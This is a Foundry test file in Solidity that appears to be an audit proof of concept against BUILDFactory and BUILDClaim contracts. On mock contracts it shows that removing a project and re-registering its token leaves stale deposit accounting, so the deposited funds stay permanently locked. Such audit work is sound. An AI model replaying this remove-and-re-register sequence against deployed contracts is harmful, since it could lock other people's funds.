// File: test/PoCIncompleteStateCleanup.t.sol
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";

import {BUILDFactory} from "src/BUILDFactory.sol";
import {BUILDClaim} from "src/BUILDClaim.sol";
import {IBUILDFactory} from "src/interfaces/IBUILDFactory.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IDelegateRegistry} from "@delegatexyz/delegate-registry/v2.0/src/IDelegateRegistry.sol";
import {IERC20Errors} from "@openzeppelin/contracts/interfaces/draft-IERC6093.sol";

contract MintableERC20 is ERC20 {
    constructor() ERC20("Mock Token", "MTK") {}
    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

contract StubRegistry {
    function checkDelegateForContract(
        address,
        address,
        address,
        bytes32
    ) external pure returns (bool) {
        return false;
    }
}

contract PoCIncompleteStateCleanup is Test {
    BUILDFactory public factory;
    MintableERC20 public token;
    StubRegistry public stubRegistry;
    address public factoryAdmin = makeAddr("factoryAdmin");
    address public originalProjectAdmin = makeAddr("originalProjectAdmin");
    address public attackerProjectAdmin = makeAddr("attackerProjectAdmin");

    function test_PoC_StaleStateCausesPermanentFundLock() public {
        // --- 1. A legitimate project deposits funds ---
        console.log("--- Phase 1: A legitimate project deposits funds ---");
        // Setup: Deploy factory and add the original project
        stubRegistry = new StubRegistry();
        token = new MintableERC20();
        vm.prank(factoryAdmin);
        factory = new BUILDFactory(
            BUILDFactory.ConstructorParams({
                admin: factoryAdmin,
                maxUnlockDuration: 30 days,
                maxUnlockDelay: 7 days,
                delegateRegistry: IDelegateRegistry(address(stubRegistry))
            })
        );
        vm.prank(factoryAdmin);
        IBUILDFactory.AddProjectParams[]
            memory addParams = new IBUILDFactory.AddProjectParams[](1);
        addParams[0] = IBUILDFactory.AddProjectParams({
            token: address(token),
            admin: originalProjectAdmin
        });
        factory.addProjects(addParams);
        // The project deposits funds into its own claim contract
        vm.prank(originalProjectAdmin);
        BUILDClaim originalClaimContract = BUILDClaim(
            address(factory.deployClaim(address(token)))
        );
        uint256 depositAmount = 1_000_000 ether;
        token.mint(originalProjectAdmin, depositAmount);
        vm.startPrank(originalProjectAdmin);
        token.approve(address(originalClaimContract), depositAmount);
        originalClaimContract.deposit(depositAmount);
        vm.stopPrank();
        assertEq(
            token.balanceOf(address(originalClaimContract)),
            depositAmount
        );
        console.log(
            "Original claim contract now holds:",
            token.balanceOf(address(originalClaimContract))
        );

        // --- 2. The project is removed via a standard administrative action ---
        console.log("\n--- Phase 2: The factory admin removes the project ---");
        vm.prank(factoryAdmin);
        address[] memory tokensToRemove = new address[](1);
        tokensToRemove[0] = address(token);
        factory.removeProjects(tokensToRemove);
        console.log("Project has been removed. Funds are now orphaned.");

        // --- 3. Verification of Broken State and Permanent Lock ---
        console.log(
            "\n--- Phase 3: Verifying the broken state and fund lock ---"
        );
        // A new entity re-registers the same token address.
        vm.prank(factoryAdmin);
        IBUILDFactory.AddProjectParams[]
            memory attackParams = new IBUILDFactory.AddProjectParams[](1);
        attackParams[0] = IBUILDFactory.AddProjectParams({
            token: address(token),
            admin: attackerProjectAdmin
        });
        factory.addProjects(attackParams);
        // The factory's accounting is now tied to the new project, but it's based on the old project's deposits.
        IBUILDFactory.TokenAmounts memory amountsAfter = factory
            .getTokenAmounts(address(token));
        assertEq(
            amountsAfter.totalDeposited,
            depositAmount,
            "CRITICAL: Stale deposit data was retained!"
        );
        console.log(
            "Factory accounting incorrectly shows",
            amountsAfter.totalDeposited,
            "available to the new project."
        );
        // The actual funds, however, remain untouched in the old, inaccessible contract.
        assertEq(
            token.balanceOf(address(originalClaimContract)),
            depositAmount,
            "Funds are confirmed to be locked in the old contract."
        );
        console.log(
            "Actual funds are still locked at address:",
            address(originalClaimContract)
        );

        // --- 4. Demonstrating the Permanent Lock ---
        console.log(
            "\n--- Exploitation Outcome: Permanent Fund Lock Confirmed ---"
        );
        // The new project admin schedules a withdrawal based on the stale data.
        vm.prank(factoryAdmin);
        factory.scheduleWithdraw(
            address(token),
            attackerProjectAdmin,
            depositAmount
        );
        console.log(
            "A withdrawal is successfully scheduled based on corrupted accounting."
        );
        // They deploy a new, empty claim contract.
        vm.prank(attackerProjectAdmin);
        BUILDClaim newClaimContract = BUILDClaim(
            address(factory.deployClaim(address(token)))
        );
        // The withdrawal execution is attempted. It will *always* fail because the new contract holding the withdrawal authority is empty.
        vm.prank(attackerProjectAdmin);
        vm.expectRevert(
            abi.encodeWithSelector(
                IERC20Errors.ERC20InsufficientBalance.selector,
                address(newClaimContract),
                0,
                depositAmount
            )
        );
        newClaimContract.withdraw();
        console.log(
            "SUCCESS: The test passed because the withdrawal reverted as expected. This proves the funds are unreachable and permanently locked."
        );
    }
}
